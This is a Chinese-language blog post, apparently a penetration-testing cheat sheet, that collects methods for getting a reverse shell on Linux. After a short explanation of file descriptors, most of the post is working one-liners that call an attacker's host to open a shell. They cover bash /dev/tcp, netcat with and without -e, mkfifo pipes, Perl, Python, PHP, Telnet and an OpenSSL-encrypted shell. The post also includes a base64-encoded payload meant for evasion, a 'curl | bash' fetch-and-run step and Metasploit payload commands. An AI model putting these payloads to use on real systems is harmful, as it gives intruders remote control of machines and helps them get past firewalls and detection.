<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>linux反弹shell方法 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="linux反弹shell方法" />
<meta property="og:description" content="linux反弹shell方法 Linux文件描述符 文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件
文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容
在Linux系统中内核默认为每个进程创建三个标准的文件描述符：
0 （标准输入）
1 （标准输出）
2（标准错误）
通过查看 /proc/PID/fd 目录下的文件，就可以查看每个进程拥有的所有文件描述符
Linux标准文件描述符的操作 Linux系统将所有设备都当作文件来处理，而Linux用文件描述符来标识每个文 件对象。当Linux启动的时候会默认打开三个文件描述符。
文件描述符缩写描述默认设备0STDIN标准输入默认设备键盘1STDOUT标准输出默认设备显示器2STDERR标准错误输出默认设备显示器 Bash反弹Shell原理 什么是反弹shell 被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。
被控端
bash -i &gt;&amp; /dev/tcp/192.168.42.132/6666 0&gt;&amp;1 攻击端
nc –lvvp 6666 参数解释
bash -i ： 打开一个交互式的bash shell /dev/tcp/IP/PORT ： /dev/tcp/是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。 0&gt;&amp;1 : 将输入重定向到标准输出，为了确保命令执行后的输入被正确的传回攻击机 打开/dev/tcp/ip/port 这个文件就相当于发起了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。
通过 socket 连接通信 向 /dev/tcp/IP/PORT 写入内容 nc -lvvp 6666 echo hello &gt; /dev/tcp/192.168.42.132/6666 从 /dev/tcp/IP/PORT 读取内容，从攻击端监听输入的内容是什么 nc -lvvp 6666 cat &lt; /dev/tcp/192.168.42.132/6666 反弹shell方法 NC 这里nc监听到的会话没有终端的回显，可以通过python -c ‘import pty; pty." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/570d0c3a9bdb193cb220e7347f01866d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-12T23:33:24+08:00" />
<meta property="article:modified_time" content="2023-07-12T23:33:24+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">linux反弹shell方法</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="linuxshell_0"></a>linux反弹shell方法</h3> 
<h4><a id="Linux_2"></a>Linux文件描述符</h4> 
<p>文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件<br> 文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容</p> 
<p>在Linux系统中内核默认为每个进程创建三个标准的文件描述符：<br> 0 （标准输入）<br> 1 （标准输出）<br> 2（标准错误）</p> 
<p>通过查看 /proc/PID/fd 目录下的文件，就可以查看每个进程拥有的所有文件描述符</p> 
<h4><a id="Linux_16"></a>Linux标准文件描述符的操作</h4> 
<p>Linux系统将所有设备都当作文件来处理，而Linux用文件描述符来标识每个文 件对象。当Linux启动的时候会默认打开三个文件描述符。</p> 
<table><thead><tr><th>文件描述符</th><th>缩写</th><th>描述</th><th>默认设备</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>标准输入</td><td>默认设备键盘</td></tr><tr><td>1</td><td>STDOUT</td><td>标准输出</td><td>默认设备显示器</td></tr><tr><td>2</td><td>STDERR</td><td>标准错误输出</td><td>默认设备显示器</td></tr></tbody></table> 
<h4><a id="BashShell_29"></a>Bash反弹Shell原理</h4> 
<h5><a id="shell_32"></a>什么是反弹shell</h5> 
<p>被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。</p> 
<p>被控端</p> 
<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.42.132/6666 0&gt;&amp;1
</code></pre> 
<p>攻击端</p> 
<pre><code>nc –lvvp 6666
</code></pre> 
<p>参数解释</p> 
<pre><code>bash -i    ：    打开一个交互式的bash shell
/dev/tcp/IP/PORT    ： /dev/tcp/是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。 

0&gt;&amp;1  : 将输入重定向到标准输出，为了确保命令执行后的输入被正确的传回攻击机
</code></pre> 
<p><strong>打开/dev/tcp/ip/port 这个文件就相当于发起了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</strong></p> 
<h6><a id="_socket__57"></a>通过 socket 连接通信</h6> 
<ol><li>向 /dev/tcp/IP/PORT 写入内容</li></ol> 
<pre><code>nc -lvvp 6666 
echo hello &gt; /dev/tcp/192.168.42.132/6666
</code></pre> 
<p><img src="https://images2.imgbox.com/a8/43/rvD4VPxz_o.png" alt="请添加图片描述"></p> 
<ol start="2"><li>从 /dev/tcp/IP/PORT 读取内容，从攻击端监听输入的内容是什么</li></ol> 
<pre><code>nc -lvvp 6666 
cat &lt; /dev/tcp/192.168.42.132/6666
</code></pre> 
<p><img src="https://images2.imgbox.com/2f/20/5qaexp0m_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/c0/30/8OhY6GxN_o.png" alt="请添加图片描述"></p> 
<h4><a id="shell_85"></a>反弹shell方法</h4> 
<h5><a id="NC_87"></a>NC</h5> 
<p><strong>这里nc监听到的会话没有终端的回显，可以通过python -c ‘import pty; pty.spawn(“/bin/bash”)’ 来获取到伪终端。</strong></p> 
<p>NC正向Shell（内鬼混进去开放端口，我方连接内鬼给的端口）<br> 原 理： 被控端使用nc将/bin/sh绑定到本地的6666端口，<strong>控制端主动连接被控端的6666端口</strong>，即可获得shell</p> 
<pre><code>被控端： nc -lvvp 6666 -e /bin/sh 
控制端： nc 10.10.1.7 6666 
</code></pre> 
<p><img src="https://images2.imgbox.com/02/f0/Ey8QQwXI_o.png" alt="请添加图片描述"><br> <img src="https://images2.imgbox.com/90/cb/QQkbHs6F_o.png" alt="请添加图片描述"></p> 
<p>反向shell（我方监听，敌方有内鬼，把终端发给我）<br> 原理： 被控端使用nc将/bin/sh发送到控制端的6666端口，控制端只需要监听本地的6666端 口，即可获得shell。<strong>这个要先监听，再让被控端托管/bin/sh</strong></p> 
<pre><code>控制端： nc -lvvp 6666

被控端： nc -e /bin/sh 192.168.42.132 6666

</code></pre> 
<p><img src="https://images2.imgbox.com/f9/b5/feFvq4Ec_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/ea/5d/jxM830Ew_o.png" alt="请添加图片描述"></p> 
<p><strong>无 -e 参数反弹shell</strong><br> 如果nc 没有 -e 的选项，那就用其他方式进行反弹shell</p> 
<p>mkfifo 命令首先创建了一个管道 文件为 f ，然后<strong>通过cat 将管道里面的内容输出传递给/bin/sh</strong>， sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道， 由此形成了一个回路。</p> 
<pre><code>//mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.42.132 6666 &gt;/tmp/f

//mknod  , 这个反弹回来shell无终端，可以使用python 给它开伪终端
mknod backpipe p; nc 192.168.42.132 6666 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe
</code></pre> 
<p><img src="https://images2.imgbox.com/eb/54/eTBOAK8o_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/72/88/3blsJU8h_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/54/69/mzWrQ2D0_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/a0/4f/Rg5kAAKN_o.png" alt="请添加图片描述"></p> 
<h5><a id="bash_145"></a>bash</h5> 
<pre><code>//经典
控制端： nc –lvvp 6666
被控端： bash -i &gt;&amp; /dev/tcp/47.101.214.85/6666 0&gt;&amp;1 


//其他方式   
exec 5&lt;&gt;/dev/tcp/192.168.42.132/6666;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done

//base 64编码的绕过
nc –lvvp 6666


bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQyLjEzMi82NjY2IDA+JjE=|base64 -d|bash -i"


//查找msf中所有payload 并查找跟bash相关的payload 然后awk '{print $1}'取出命令结果的第一列，这里是负载类型的名称。
msfvenom -l payloads | grep "bash" | awk '{print $1}'

//msf恶意文件
msfvenom -p cmd/unix/reverse_bash lhost=10.10.1.11 lport=6666 - f raw
</code></pre> 
<p>命令解释：<br> exec 5&lt;&gt;/dev/tcp/192.168.42.132/6666 ： 代表这个文件描述符5可以对/dev/tcp这个文件进行读写操作<br> cat &lt;&amp;5 ： 把文件描述符5的内容 用cat 进行输出（用cat 来读取文件描述符5 的内容）<br> while read line ： 循环，当有内容的时候，会执行错误输入和标准输入都重定向到文件描述符5指向的文件。</p> 
<p><img src="https://images2.imgbox.com/ed/d0/gt1EJkKv_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/b5/96/Bee2wEJM_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/bc/3f/XTnJJxUX_o.png" alt="请添加图片描述"></p> 
<h5><a id="Perl_187"></a>Perl</h5> 
<pre><code>perl -e 'use Socket;$i="47.101.214.85";$p=6666;socket(S,PF_INET,SOCK_STREAM, getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i )))) {open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec(" /bin/sh -i");};'
</code></pre> 
<p>这段Perl代码使用Socket模块创建了一个TCP套接字连接到IP地址为"47.101.214.85"，端口号为"6666"的远程服务器。如果连接成功，它会将标准输入、输出和错误输出重定向到socket连接的文件描述符，并执行命令"/bin/sh -i"，生成一个交互式Shell，从而使用户能够通过shell与远程服务器进行交互。</p> 
<p><img src="https://images2.imgbox.com/18/b3/S23RjsyS_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/5f/df/F98kz7PK_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/59/2a/hk9Fm4Uy_o.png" alt="请添加图片描述"></p> 
<pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"47.101.214.85:6666");STDIN- &gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
</code></pre> 
<p>使用IO模块建立一个TCP反弹shell。<br> 先使用fork创建一个子进程。 如果当前进程是子进程，则退出，这是为了让子进程成为后台进程。<br> 如果当前进程是父进程，则创建一个新的IO::Socket::INET对象，并连接到目标主机的IP地址为"47.101.214.85"，端口号为"6666"的地方，并获得与socket对象的文件描述符相关联的I/O流。<br> 使用system函数在Shell中执行输入的命令。</p> 
<p><img src="https://images2.imgbox.com/ca/5b/mODSZZtt_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/58/e7/7uaycT8v_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/8b/9a/PPSScvfM_o.png" alt="请添加图片描述"></p> 
<h5><a id="curl_225"></a>curl</h5> 
<pre><code>攻击机
//先编辑一个html文件 ，写入自己的反弹Shell，再开启http 服务提供远程的下载

//受害机器请求连接，并用bash解释器将curl下载的文件作为脚本执行
curl http://192.168.42.132:8000/shell.html | bash

</code></pre> 
<p><img src="https://images2.imgbox.com/b3/98/6LkO5669_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/d2/e4/sv2lfZAe_o.png" alt="请添加图片描述"><br> <img src="https://images2.imgbox.com/f5/df/lOiRVq1c_o.png" alt="请添加图片描述"></p> 
<h5><a id="Python_247"></a>Python</h5> 
<p>Python一行命令反弹shell</p> 
<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.101.214.85",6666));os.dup2(s.fileno(),0 );os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call (["/bin/sh","-i"]);'
</code></pre> 
<ol><li>导入Python的socket、subprocess和os模块。</li><li>使用socket模块创建一个AF_INET类型和SOCK_STREAM类型的socket对象s。</li><li>使用s.connect()方法连接到主机地址为 47.101.214.85 端口为 6666的服务器端口。</li><li>使用os.dup2()方法将标准输入、标准输出和标准错误连接到socket句柄，这是为了方便和远程服务器进行交互。</li><li>使用subprocess模块调用/bin/sh shell，" -i"参数表示启动交互式shell。</li></ol> 
<p><img src="https://images2.imgbox.com/59/b4/1HVvz7L1_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/c8/01/KNo5b76W_o.png" alt="请添加图片描述"></p> 
<p>通过Msfvenom生成python反弹shell的payload</p> 
<pre><code>//会自动生成payload 然后受害机器上 python -c "payload"
msfvenom -p python/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=6666 -f raw 
handler -p python/meterpreter/reverse_tcp -H 139.155.49.43 -P 6666


//通过Web delivery反弹shell
use exploit/multi/script/web_delivery
set target 0
set payload python/meterpreter/reverse_tcp
set lport 6666
exploit –j
</code></pre> 
<p><img src="https://images2.imgbox.com/93/a2/zge1KLBN_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/0c/69/6WVLiFMh_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/48/03/KP29AjVg_o.png" alt="请添加图片描述"></p> 
<p>web传递方式</p> 
<p><img src="https://images2.imgbox.com/b4/8a/MWZRV5pZ_o.png" alt="请添加图片描述"></p> 
<h5><a id="PHP_299"></a>PHP</h5> 
<p>msfvenom -l payload | grep “php” | awk '{print($1)}’<br> PHP一行命令反弹shell</p> 
<pre><code>php -r '$sock=fsockopen("47.101.214.85",7777);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</code></pre> 
<h5><a id="Ruby_307"></a>Ruby</h5> 
<p>msfvenom -l payload | grep “ruby” | awk ‘{print($1)}’</p> 
<pre><code>msfvenom -p cmd/unix/bind_ruby lport=6666 -f raw
</code></pre> 
<h5><a id="Telnet_314"></a>Telnet</h5> 
<p>受害机器要安装了才可以</p> 
<pre><code>攻击机： nc -lvvp 5555 nc -lvvp 6666 
目标机： telnet 47.101.214.85 5555 | /bin/bash | telnet 47.101.214.85 6666
</code></pre> 
<h5><a id="OpenSSL_325"></a>OpenSSL</h5> 
<p>openssl反弹443端口，流量加密传输</p> 
<ol><li>在远程攻击主机上生成秘钥文件</li></ol> 
<pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
</code></pre> 
<ol start="2"><li>在远程攻击主机上启动监视器</li></ol> 
<pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 443
</code></pre> 
<ol start="3"><li>在目标机上反弹shell</li></ol> 
<pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client - quiet -connect 192.168.42.132:443 &gt; /tmp/s; rm /tmp/s
</code></pre> 
<p><img src="https://images2.imgbox.com/4e/d3/mXqH288Z_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/79/f5/lhIDnT6w_o.png" alt="请添加图片描述"></p> 
<h4><a id="shellwebshell_348"></a>注意所有操作都需要得到shell或webshell后才可以进行反弹操作，本文总结的是反弹的各类方法，以不同的环境用不同的手段</h4>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/1217e7797b9d8a9f6b72b2e561915ec5/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">在写SpringMVC项目时出现org.springframework.web.servlet.support等程序包不存在问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/50115aa4138b0601086cbf1637ffbe4e/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">“坏邻居”导致的kafka生产者TPS下降原因排查</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>